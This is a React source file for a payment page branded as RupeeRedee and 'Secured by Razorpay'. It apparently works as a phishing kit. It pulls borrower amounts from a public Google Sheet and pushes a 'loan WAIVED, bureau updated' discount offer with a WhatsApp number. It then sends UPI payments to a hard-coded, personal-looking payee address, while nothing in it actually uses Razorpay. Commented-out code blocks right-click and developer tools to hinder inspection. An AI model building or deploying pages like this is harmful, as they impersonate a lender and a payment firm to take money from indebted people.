
import "./RupeeRedeePayment.css"; // custom CSS file (styles niche diye gaye hain)
import RupeeRedeeLogo from './rupee_redee.png'
import React, { useEffect, useState } from "react";
const RupeeRedeePayment = () => {

    // Replace with your valid VPA and desired name
    const PA = "7551178138@ptsbi";
    const PN = "RupeeRedee";

    const [showMore, setShowMore] = useState(false);
    const [amount, setAmount] = useState("");
    const [receipt, setReceipt] = useState("");
    const [expiry, setExpiry] = useState("");
    const [loading, setLoading] = useState(true);
    const [enteredMobile, setEnteredMobile] = useState("");
    const [sheetMobile, setSheetMobile] = useState(""); // jo sheet se aya

    const SHEET_CSV_URL =
        "https://docs.google.com/spreadsheets/d/1OSL05vle8o3bTG3ICnCd5bH6xHnPLHabh9hJTScYRPw/gviz/tq?tqx=out:csv&sheet=Sheet1";

    // CSV parser (handles quotes properly)
    const parseCSV = (str) => {
        const rows = [];
        let insideQuote = false, value = "", row = [];
        for (let char of str) {
            if (char === '"') {
                insideQuote = !insideQuote;
            } else if (char === "," && !insideQuote) {
                row.push(value);
                value = "";
            } else if (char === "\n" && !insideQuote) {
                row.push(value);
                rows.push(row);
                row = [];
                value = "";
            } else {
                value += char;
            }
        }
        if (value) row.push(value);
        if (row.length) rows.push(row);
        return rows;
    };

    useEffect(() => {


        
        const params = new URLSearchParams(window.location.search);
        const mobileParam = params.get("mobile");

        fetch(SHEET_CSV_URL)
            .then((res) => res.text())
            .then((csv) => {
                const rows = parseCSV(csv);
                const headers = rows[0];
                const data = rows.slice(1);

                const mobileIndex = headers.findIndex((h) =>
                    h.toLowerCase().includes("mobile")
                );
                const amountIndex = headers.findIndex((h) =>
                    h.toLowerCase().includes("amount")
                );
                const receiptIndex = headers.findIndex((h) =>
                    h.toLowerCase().includes("receipt")
                );
                const expiryIndex = headers.findIndex((h) =>
                    h.toLowerCase().includes("expire")
                );

                const match = data.find(
                    (row) => row[mobileIndex]?.trim() === mobileParam
                );

                if (match) {
                    if (amountIndex >= 0) setAmount(match[amountIndex].trim());
                    if (receiptIndex >= 0) setReceipt(match[receiptIndex].trim());
                    if (expiryIndex >= 0) setExpiry(match[expiryIndex].trim());
                     if (mobileIndex >= 0) setSheetMobile(match[mobileIndex].trim()); 
                } else {
                    setAmount("Not Found");
                }
            })
            .catch((err) => console.error("Error loading sheet:", err))
            .finally(() => setLoading(false));


    //          // Disable right-click
    // const disableRightClick = (e) => e.preventDefault();
    // document.addEventListener("contextmenu", disableRightClick);

    // // Disable F12, Ctrl+Shift+I, Ctrl+U
    // const disableKeys = (e) => {
    //   if (e.keyCode === 123) {
    //     e.preventDefault(); // F12
    //   }
    //   if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) {
    //     e.preventDefault(); // Ctrl+Shift+I
    //   }
    //   if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) {
    //     e.preventDefault(); // Ctrl+U
    //   }
    // };
    // document.addEventListener("keydown", disableKeys);


    
    // Cleanup on unmount
    }, []);

    //   const handleClick = () => {
    //     if (!amount || amount === "Not Found") return alert("Invalid payment link!");
    //     const upi = `upi://pay?pa=${encodeURIComponent(PA)}&pn=${encodeURIComponent(
    //       PN
    //     )}&am=${encodeURIComponent(amount)}&cu=INR&tn=${encodeURIComponent("Payment")}`;
    //     window.location.href = upi;
    //   };


    // input change handler
    const handleMobileChange = (e) => {
        setEnteredMobile(e.target.value);
    };
// continue click handler
const handleClick = () => {
  if (!enteredMobile) {
    alert("Please enter your mobile number");
    return;
  }

  // Sanitize both values

    const cleanEntered = enteredMobile.replace(/"/g, "").trim();
  const cleanSheet = sheetMobile.replace(/"/g, "").trim();

  if (cleanEntered !== cleanSheet) {
    alert("Mobile number not found or does not match our records");
    return;
  }

  const upi = `upi://pay?pa=${encodeURIComponent(PA)}&pn=${encodeURIComponent(
    PN
  )}&am=${encodeURIComponent(amount)}&cu=INR&tn=${encodeURIComponent("Payment")}`;

  window.location.href = upi;
};


    return (
        <div className="container my-5 mobile-only">
            <div className="row row-cols-1 row-cols-md-2 g-4" style={{ textAlign: 'left' }} >
                {/* Left Box */}
                <div className="col-md-6">
                    <div className="card p-4">
                        <h5 className="fw-bold">Payment Request from RupeeRedee</h5>

                        <div className="mt-3">
                            <div className="info-label">Payment For</div>
                          <div className="info-text">
      Dear Customer, Limited Days Offer! Never Before Offer to improve
      Bureau in Heavy Discount! Avail heavy discount on your outstanding
      amount and close your loan as WAIVED. Bureau will be updated
      accordingly...

      {!showMore && (
        <button
          style={{
            border: "0px",
            background: "none",
            color: "blue",
            cursor: "pointer",
            marginLeft: "5px",
          }}
          onClick={() => setShowMore(true)}
        >
          Show More
        </button>
      )}

      {showMore && (
        <p style={{ marginTop: "10px" }}>
          In case of any query Call at <strong>7669680696</strong> or click link to chat :{" "}
          <a
            href="https://wa.me/+917669680696"
            target="_blank"
            rel="noopener noreferrer"
          >
            https://wa.me/+917669680696
          </a>. Loan closure letter will be issued within 7 business days of
          the payment being received by us. <strong>Team RupeeRedee</strong>.
          Ignore if already paid.
        </p>
      )}
    </div>
                        </div>

                        <div className="mt-3">
                            <div className="info-label">Receipt</div>
                            <div className="info-text">
                                {loading ? "Loading..." : receipt || "N/A"}
                            </div>
                        </div>

                        <div className="mt-3">
                            <div className="info-label">Expire By</div>
                            <div className="info-text">
                                {loading ? "Loading..." : expiry || "N/A"}
                            </div>
                        </div>

                        <div className="mt-3">
                            <div className="info-label">Amount Payable</div>

                            <div className="amount-text" style={{ color: "#192839" }}>
                                {loading ? "Loading..." : `INR ${amount.replace(/"/g, "")}`}
                            </div>
                        </div>

                        <div className="mt-4 border-top pt-3">
                            <p className="mb-1">
                                For any queries, please contact{" "}
                                <strong>FINCFRIENDS PVT. LTD.</strong>
                            </p>
                            <p className="mb-0">care@rupeeredee.com</p>
                        </div>
                    </div>
                </div>

                {/* Right Box */}
            
                <div className="col-md-5"  >
                    <div className="card h-100 d-flex flex-column" style={{
      overflowY: "auto",       // scroll enable
    maxHeight: "500px",      // iframe जैसी fix height
    borderRadius:"5px",
  }}>
                        <div className="brand-box text-center">
                            <img src={RupeeRedeeLogo} alt="RupeeRedee Logo" />
                            <h6 className="mb-1" style={{ fontWeight: 600 }}>
                                RupeeRedee
                            </h6>
                            <br />
                            <div className="fw-light" style={{ fontSize: "small" }}>
                                Total Amount
                            </div>
                            <div className="amount-text " style={{ color: 'white' }}>
                                {loading ? "Loading..." : `₹ ${amount.replace(/"/g, "")}`}
                            </div>
                        </div>

                        <div className="p-4 flex-grow-1">
                            <div className="mb-2 fw-semibold">Contact details</div>
                            <label htmlFor="mobile" className="form-label">
                                Enter mobile number to continue
                            </label>
                            <div className="input-group mb-3">
                                <span className="input-group-text">+91</span>
                                <input
                                    type="tel"
                                    className="form-control"
                                    placeholder="Mobile number"
                                    id="mobile"
                                    value={enteredMobile}
                                    onChange={handleMobileChange}
                                />
                            </div>

                            <button
                                className="btn continue-btn w-100 mt-2"
                                style={{
                                    color: "#fff",
                                    background: "#000",
                                    padding: ".5rem .75rem",
                                    borderRadius: ".25rem",
                                }}
                                onClick={handleClick}
                            >
                                Continue
                            </button>

                            <p className="footer-text mt-3 text-center">
                                By proceeding, I agree to Razorpay's <a href="https://razorpay.com/payment-links">Privacy Notice</a>
                                <br />
                                <a href="https://razorpay.com/payment-links">Edit Preferences</a>
                            </p>
                        </div>
                     {/* Footer */}
            <div className="text-center mt-4 p-3 bg-white rounded shadow-sm">
                <div className="security-box d-flex align-items-center justify-content-center">
                    <img src="https://cdn.razorpay.com/logo.svg" width={"10%"} alt="Razorpay" />&nbsp; Secured by Razorpay
                </div>
            </div>
                    </div>
                    
                </div>



             

                
            </div>

            {/* Footer */}
            <div className="text-center mt-4 p-3 bg-white rounded shadow-sm">
                <div className="security-box d-flex align-items-center justify-content-center">
                    <img src="https://cdn.razorpay.com/logo.svg" width={"10%"} alt="Razorpay" />&nbsp; Secured by Razorpay
                </div>
                <p className="footer-text mt-2 mb-0">
                    Want to create payment links for your business? Visit <a href="https://razorpay.com/payment-links">razorpay.com/payment-links</a>
                    Please report this Payment Link if you find it to be suspicious.
                </p>
            </div>
        </div>
    );
};

export default RupeeRedeePayment;
